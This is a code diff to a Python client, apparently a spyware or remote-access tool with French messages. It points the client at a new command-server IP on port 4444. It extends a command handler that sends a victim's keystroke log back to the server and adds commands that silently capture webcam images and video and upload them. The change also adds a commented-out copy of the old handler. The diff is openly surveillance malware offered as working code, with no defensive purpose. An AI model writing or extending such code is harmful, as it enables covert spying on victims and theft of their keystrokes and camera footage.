@@ -6,7 +6,7 @@ import os
 import sys
 import time
 
-SERVER_IP = "192.168.13.1"
+SERVER_IP = "192.168.196.1"
 SERVER_PORT = 4444
 
 if getattr(sys, 'frozen', False):
@@ -49,6 +49,26 @@ def wait_for_file(file_path, timeout=10):
         time.sleep(1)
     return True
 
+# def handle_commands(client_socket):
+#     try:
+#         while True:
+#             command = client_socket.recv(1024).decode('utf-8')
+
+#             if command == "keylogger":
+#                 if wait_for_file(KEYLOG_FILE):
+#                     send_file(client_socket, KEYLOG_FILE, "keystroke")
+#                 else:
+#                     print(f"[-] Le fichier keylogger est introuvable après l'attente.")
+
+#             elif command == "webcam":
+#                 subprocess.run([WEBCAM_EXE], check=True)
+#                 if wait_for_file(WEBCAM_FILE):
+#                     send_file(client_socket, WEBCAM_FILE, "webcam_capture")
+#                 else:
+#                     print(f"[-] Le fichier de la webcam est introuvable après l'attente.")
+#     except Exception as e:
+#         print(f"[Erreur] de connexion : {e}")
+
 def handle_commands(client_socket):
     try:
         while True:
@@ -57,17 +77,21 @@ def handle_commands(client_socket):
             if command == "keylogger":
                 if wait_for_file(KEYLOG_FILE):
                     send_file(client_socket, KEYLOG_FILE, "keystroke")
-                else:
-                    print(f"[-] Le fichier keylogger est introuvable après l'attente.")
 
-            elif command == "webcam":
-                subprocess.run([WEBCAM_EXE], check=True)
-                if wait_for_file(WEBCAM_FILE):
-                    send_file(client_socket, WEBCAM_FILE, "webcam_capture")
-                else:
-                    print(f"[-] Le fichier de la webcam est introuvable après l'attente.")
+            elif command == "capture_image":
+                subprocess.run([WEBCAM_EXE, "image"], check=True)
+                image_file = os.path.join(BASE_DIR, "captures", "webcam_capture.jpg")
+                if wait_for_file(image_file):
+                    send_file(client_socket, image_file, "webcam_capture")
+
+            elif command == "capture_video":
+                subprocess.run([WEBCAM_EXE, "video"], check=True)
+                video_file = os.path.join(BASE_DIR, "captures", "webcam_video.avi")
+                if wait_for_file(video_file):
+                    send_file(client_socket, video_file, "webcam_capture")
     except Exception as e:
         print(f"[Erreur] de connexion : {e}")
+
 
 def main():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
